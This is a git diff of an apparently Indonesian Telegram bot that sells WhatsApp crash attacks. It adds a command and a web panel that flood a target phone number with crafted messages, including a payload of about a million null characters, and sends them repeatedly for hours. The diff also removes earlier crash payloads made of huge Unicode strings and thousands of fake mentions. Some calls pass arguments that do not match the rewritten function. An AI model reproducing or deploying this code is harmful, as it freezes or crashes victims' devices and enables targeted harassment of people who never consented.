@@ -500,6 +500,63 @@ bot.command("delowner", (ctx) => {
   ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
 });
 
+bot.command("tesfnc", checkWhatsAppConnection, checkPremium, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id.toString();
+  const chatId = ctx.chat.id;
+
+  if (!q) return ctx.reply("❗ Contoh:\n/tesfnc 628xxxx");
+
+  if (!isActiveUser(ownerUsers, userId)) {
+    if (isOnGlobalCooldown()) {
+      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
+      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
+    }
+  }
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  const sentMessage = await ctx.sendPhoto(prosesImg, {
+    caption: `\`\`\`
+Proses mengirim bug...
+\`\`\`
+Target: ${q}
+Type: crashui
+Status: Sending`,
+    parse_mode: "Markdown",
+  });
+  
+  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");
+
+  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
+
+  for (let i = 0; i < 50; i++) {
+    await rodok1(target);
+    await rodok1(target);
+  }
+  
+  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");
+
+  await ctx.editMessageCaption(
+    `\`\`\`
+Sukses mengirim bug
+\`\`\`
+Target: ${q}
+Type: crashui
+Status: Sukses`,
+    {
+      chat_id: chatId,
+      message_id: sentMessage.message_id,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "проверить цели", url: `https://wa.me/${q}` }],
+        ],
+      },
+    }
+  );
+});
+
 // ==================== BOT INITIALIZATION ==================== //
 console.clear();
 console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -667,244 +724,63 @@ module.exports = {
 };
 
 // ==================== FLOOD FUNCTIONS ==================== //
-async function bulldozer1GB(X) {
-  let parse = true;
-  if (11 > 9) {
-    parse = parse ? false : true;
-  }
-  
-    let locationMessage = {
-      degreesLatitude: -9.09999262999,
-      degreesLongitude: 199.99963118999,
-      jpegThumbnail: null,
-      name: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
-      address: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
-      url: `https://rizxvelz-crashno.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
-      contextInfo: {
-        participant: X,
-        mentionedJid: [
-          "0@s.whatsapp.net",
-          ...Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-        ],
-      },
-    };  
-  let StickerMessage = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: `https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0&mms3=true`,
-          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
-          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
-          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
-          mimetype: `image/webp`,
-          directPath:
-            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
-          fileLength: {
-            low: Math.floor(Math.random() * 1000),
-            high: 0,
-            unsigned: true,
-          },
-          mediaKeyTimestamp: {
-            low: Math.floor(Math.random() * 1700000000),
-            high: 0,
-            unsigned: false,
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            participant: X,
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from(
-                {
-                  length: 2000,
-                },
-                () =>
-                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-              ),
-            ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
-          },
-          stickerSentTs: {
-            low: Math.floor(Math.random() * -20000000),
-            high: 555,
-            unsigned: parse,
-          },
-          isAvatar: parse,
-          isAiSticker: parse,
-          isLottie: parse,
-        },
-      },
-    },
-  };
-
-  const msg1 = generateWAMessageFromContent(X, { viewOnceMessage: { message: locationMessage }}, {});
-  const msg2 = generateWAMessageFromContent(X, StickerMessage, {});
-  
-  for (const msg of [msg1]) {
-  await sock.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [X],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: X },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
-  });
- }
- console.log(randomColor()("─────「 ⏤!New Bulldozer!⏤ 」─────"))
-}
-async function NewProtocolbug6(X) {
-  try {
-    let msg = await generateWAMessageFromContent(X, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: "ោ៝".repeat(10000),
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "address_message",
-              paramsJson: "\u0000".repeat(999999),
-              version: 3
-            },
-            contextInfo: {
-              mentionedJid: [
-              "6289501955295@s.whatsapp.net",
-              ...Array.from({ length: 1900 }, () =>
-              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-              )
-              ],
-              isForwarded: true,
-              forwardingScore: 9999,
-              forwardedNewsletterMessageInfo: {
-                newsletterName: "sexy.com",
-                newsletterJid: "333333333333333333@newsletter",
-                serverMessageId: 1
-              }
+async function rodok1(sock, x, z) {
+    let msg = await generateWAMessageFromContent(x, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "SomeOne Is Coming!!!",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\u0000".repeat(1045000),
+                        version: 3
+                    },
+                   entryPointConversionSource: "galaxy_message", //kalau bug nya ga ke kirim hapus aja ini, cuma tambahan doang.
+                }
             }
-          }
         }
-      }
-    }, {});
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 0,
+        isForwarded: false,
+        font: Math.floor(Math.random() * 9),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+    });
 
     await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [X],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                { tag: "to", attrs: { jid: X }, content: undefined }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-    console.log(randomColor()("─────「 ⏤!Delay StuckFreze!⏤ 」─────"))
-  } catch (err) {
-    console.error("[bug error]", err);
-  }
-}
-
-async function iosinVisFC(X) {
-   try {
-      let locationMessage = {
-         degreesLatitude: -9.09999262999,
-         degreesLongitude: 199.99963118999,
-         jpegThumbnail: null,
-         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
-         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
-         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
-      }
-
-      let extendMsg = {
-         extendedTextMessage: { 
-            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
-            matchedText: ".welcomel...",
-            description: "𑇂𑆵𑆴𑆿".repeat(25000),
-            title: "𑇂𑆵𑆴𑆿".repeat(15000),
-            previewType: "NONE",
-            jpegThumbnail: "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",
-            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
-            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
-            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
-            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
-            mediaKeyTimestamp: "1743101489",
-            thumbnailHeight: 641,
-            thumbnailWidth: 640,
-            inviteLinkGroupTypeV2: "DEFAULT"
-         }
-      }
-      
-      let msg1 = generateWAMessageFromContent(X, {
-         viewOnceMessage: {
-            message: {
-               locationMessage
-            }
-         }
-      }, {});
-      let msg2 = generateWAMessageFromContent(X, {
-         viewOnceMessage: {
-            message: {
-               extendMsg
-            }
-         }
-      }, {});
-      for (const msg of [msg1, msg2]) {
-      await sock.relayMessage('status@broadcast', msg.message, {
-         messageId: msg.key.id,
-         statusJidList: [X],
-         additionalNodes: [{
-            tag: 'meta',
+        messageId: msg.key.id,
+        statusJidList: [x],
+        additionalNodes: [{
+            tag: "meta",
             attrs: {},
             content: [{
-               tag: 'mentioned_users',
-               attrs: {},
-               content: [{
-                  tag: 'to',
-                  attrs: {
-                     jid: X
-                  },
-                  content: undefined
-               }]
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                    { tag: "to", attrs: { jid: x }, content: undefined }
+                ]
             }]
-         }]
-      });
-     }
-   console.log(randomColor()("─────「 ⏤!CrashNo IoSInvis!⏤ 」─────"))
-   } catch (err) {
-      console.error(err);
-   }
-};
+        }]
+    });
+
+    await sleep(2000);
+
+    if (z) {
+        await sock.relayMessage(x, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg.key,
+                        type: 25,
+                    },
+                },
+            },
+        }, {});
+    }
+}
 
 async function GetSuZoXAndros(durationHours, X) {
   const totalDurationMs = durationHours * 3600000;
@@ -922,8 +798,8 @@ async function GetSuZoXAndros(durationHours, X) {
     try {
       if (count < 400) {
         await Promise.all([
-          bulldozer1GB(X),
-          NewProtocolbug6(X)
+          rodok1(X),
+          rodok1(X)
         ]);
         console.log(chalk.yellow(`
 ┌────────────────────────┐
@@ -967,9 +843,9 @@ async function iosflood(durationHours, X) {
     try {
       if (count < 400) {
         await Promise.all([
-          iosinVisFC(X),
-          NewProtocolbug6(X),
-          bulldozer1GB(X)
+          rodok1(X),
+          rodok1(X),
+          rodok1(X)
         ]);
         console.log(chalk.yellow(`
 ┌────────────────────────┐
@@ -996,3 +872,243 @@ async function iosflood(durationHours, X) {
   };
   sendNext();
 }
+
+// ==================== HTML TEMPLATE ==================== //
+const executionPage = (
+  status = "🟥 Ready",
+  detail = {},
+  isForm = true,
+  userInfo = {},
+  message = "",
+  mode = ""
+) => {
+  const { username, expired } = userInfo;
+  const formattedTime = expired
+    ? new Date(expired).toLocaleString("id-ID", {
+      timeZone: "Asia/Jakarta",
+      year: "2-digit",
+      month: "2-digit",
+      day: "2-digit",
+      hour: "2-digit",
+      minute: "2-digit",
+    })
+    : "-";
+
+  return `<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Web-Api</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(135deg, #000000, #330033, #7f007f);
+      background-size: 400% 400%;
+      animation: bgAnimation 20s ease infinite;
+      color: #cc66ff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid #cc00ff;
+      padding: 24px;
+      border-radius: 20px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 0 16px rgba(204, 0, 255, 0.8);
+      backdrop-filter: blur(10px);
+      position: relative;
+    }
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 12px;
+      display: block;
+      border-radius: 50%;
+      box-shadow: 0 0 16px rgba(204, 0, 255, 0.8);
+      object-fit: cover;
+    }
+    .username {
+      font-size: 22px;
+      color: #cc99ff;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+    .connected {
+      font-size: 14px;
+      color: #cc00ff;
+      margin-bottom: 16px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .connected::before {
+      content: '';
+      width: 10px;
+      height: 10px;
+      background: #00ff5eff;
+      border-radius: 50%;
+      display: inline-block;
+      margin-right: 8px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      background: #1a001a;
+      border: none;
+      color: #cc99ff;
+      margin-bottom: 16px;
+    }
+    .buttons-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .buttons-grid button {
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: #330033;
+      color: #cc66ff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .buttons-grid button.selected {
+      background: #cc00ff;
+      color: #000;
+    }
+    .execute-button {
+      background: #9900cc;
+      color: #fff;
+      padding: 14px;
+      width: 100%;
+      border-radius: 10px;
+      font-weight: bold;
+      border: none;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .execute-button:disabled {
+      background: #660066;
+      cursor: not-allowed;
+      opacity: 0.5;
+    }
+    .execute-button:hover:not(:disabled) {
+      background: #cc66ff;
+    }
+    .footer-action-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      margin-top: 20px;
+    }
+    .footer-button {
+      background: rgba(153, 0, 255, 0.15);
+      border: 1px solid #cc00ff;
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 14px;
+      color: #cc66ff;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: background 0.3s ease;
+    }
+    .footer-button:hover {
+      background: rgba(153, 0, 255, 0.3);
+    }
+    .footer-button a {
+      text-decoration: none;
+      color: #cc66ff;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://e.top4top.io/p_3501jjn601.jpg" alt="Logo" class="logo" />
+    <div class="username">Welcome User, ${username || 'Anonymous'}</div>
+    <div class="connected">CONNECTED</div>
+
+    <input type="text" placeholder="Please input target number. example : 62xxxx" />
+
+    <div class="buttons-grid">
+      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> TRAVAS ANDRO</button>
+      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> TRAVAS IPHONE</button>
+    </div>
+
+    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> EXECUTE</button>
+
+    <div class="footer-action-container">
+      <div class="footer-button developer">
+        <a href="https://t.me/Rbcdeep" target="_blank">
+          <i class="fab fa-telegram"></i> Developer
+        </a>
+      </div>
+      <div class="footer-button logout">
+        <a href="/logout">
+          <i class="fas fa-sign-out-alt"></i> Logout
+        </a>
+      </div>
+      <div class="footer-button user-info">
+        <i class="fas fa-user"></i> ${username || 'Unknown'}
+        &nbsp;|&nbsp;
+        <i class="fas fa-hourglass-half"></i> ${formattedTime}
+      </div>
+    </div>
+  </div>
+  <script>
+    const inputField = document.querySelector('input[type="text"]');
+    const modeButtons = document.querySelectorAll('.mode-btn');
+    const executeBtn = document.getElementById('executeBtn');
+
+    let selectedMode = null;
+
+    function isValidNumber(number) {
+      const pattern = /^62\\d{7,13}$/;
+      return pattern.test(number);
+    }
+
+    modeButtons.forEach(button => {
+      button.addEventListener('click', () => {
+        modeButtons.forEach(btn => btn.classList.remove('selected'));
+        button.classList.add('selected');
+        selectedMode = button.getAttribute('data-mode');
+        executeBtn.disabled = false; // Aktifkan tombol setelah mode dipilih
+      });
+    });
+
+    executeBtn.addEventListener('click', () => {
+      const number = inputField.value.trim();
+      if (!isValidNumber(number)) {
+        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
+        return;
+      }
+      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
+    });
+  </script>
+</body>
+</html>`;
+};
